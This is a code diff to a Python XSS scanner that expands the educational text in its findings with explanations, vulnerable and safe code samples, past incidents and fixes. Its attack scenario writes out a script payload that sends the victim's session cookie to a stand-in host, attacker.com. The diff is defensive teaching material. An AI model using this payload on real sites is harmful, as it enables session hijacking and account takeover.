@@ -213,11 +213,62 @@ class XSSScanner:
     def _make_finding(self, url, parameter, payload, context, evidence, severity):
         import json as _json
 
+        base_url = url.split('?')[0]
+
         edu = {
-            'what': 'Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious scripts into web pages viewed by other users.',
-            'how':  f'The payload `{payload}` was submitted via {context} `{parameter}` and was reflected in the server\'s response without being properly encoded. If a victim visits a crafted URL, the script executes in their browser.',
-            'why':  'XSS can allow attackers to steal session cookies (account takeover), redirect users to phishing sites, log keystrokes, deface web pages, or perform actions on behalf of victims.',
-            'fix':  'Always HTML-encode user input before displaying it in the page. Use a Content Security Policy (CSP) header. Validate and sanitise all input on the server side. Use modern frameworks that auto-escape output (e.g., Jinja2, React).',
+            'what': (
+                "Cross-Site Scripting (XSS) lets an attacker inject JavaScript into a web page that other users will view. "
+                "The browser has no way to know the script wasn't written by the site itself — so it runs it with full trust.\n\n"
+                "Reflected XSS: the payload is in the URL, the server echoes it back immediately. Requires victim to click a crafted link.\n"
+                "Stored XSS: the payload is saved in the database and runs for every user who views the affected page — far more dangerous."
+            ),
+            'attack_scenario': (
+                f"We submitted this payload via {context} '{parameter}':\n"
+                f"  {payload}\n\n"
+                "The server returned it unescaped inside the HTML response. "
+                "A real attacker would send this link to a victim:\n\n"
+                f"  {base_url}?{parameter}=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n\n"
+                "When the victim opens the link, the script runs in their browser — silently — "
+                "and sends their session cookie to the attacker. The attacker then uses that cookie "
+                "to log in as the victim without needing their password."
+            ),
+            'vulnerable_code': (
+                "# ❌ Jinja2 — | safe disables auto-escaping, renders raw HTML tags\n"
+                "{{ user_input | safe }}\n\n"
+                "// ❌ JavaScript — innerHTML parses and executes HTML/JS\n"
+                "document.getElementById('output').innerHTML = userInput;\n\n"
+                "// ❌ React — opt-in raw HTML, no built-in sanitisation\n"
+                "<div dangerouslySetInnerHTML={{__html: userInput}} />"
+            ),
+            'safe_code': (
+                "# ✅ Jinja2 — auto-escapes < > \" ' & by default (just remove | safe)\n"
+                "{{ user_input }}\n\n"
+                "// ✅ JavaScript — textContent treats input as text, never HTML\n"
+                "document.getElementById('output').textContent = userInput;\n\n"
+                "// ✅ If you MUST insert HTML, sanitise it first:\n"
+                "element.innerHTML = DOMPurify.sanitize(userInput);"
+            ),
+            'real_impact': (
+                "XSS is behind some of the most impactful web attacks:\n\n"
+                "• 2005 — Samy Worm (MySpace): a stored XSS worm added 1 million friends in 20 hours, "
+                "crashing the site and leading to the author's arrest\n"
+                "• 2014 — eBay: stored XSS redirected buyers to phishing sites during checkout\n"
+                "• 2018 — British Airways (Magecart): XSS-based script injection stole 380,000 "
+                "payment card details in real time at checkout\n\n"
+                "Reflected XSS is the most common type and is the basis of nearly every "
+                "session hijacking and credential phishing attack sent via malicious links."
+            ),
+            'fix': (
+                "1. HTML-encode all output — Jinja2 auto-escapes by default, never use | safe with user data.\n\n"
+                "2. Use textContent (not innerHTML) in JavaScript when inserting user-controlled text.\n\n"
+                "3. Add a Content-Security-Policy header — script-src 'self' blocks injected scripts\n"
+                "   even if the encoding step fails.\n\n"
+                "4. Validate input on the server: reject unexpected characters, enforce length limits.\n\n"
+                "5. If you must render user HTML (e.g. a comment editor), run it through DOMPurify\n"
+                "   before inserting — never trust raw user HTML."
+            ),
+            'owasp': 'https://owasp.org/www-community/attacks/xss/',
+            'cvss':  'CVSS 6.1 Medium (reflected) / 8.8 High (stored) — can hijack sessions, steal data, deface pages',
         }
 
         self._log(f"[XSS-{severity.upper()}] Reflected XSS in '{parameter}' at {url}")
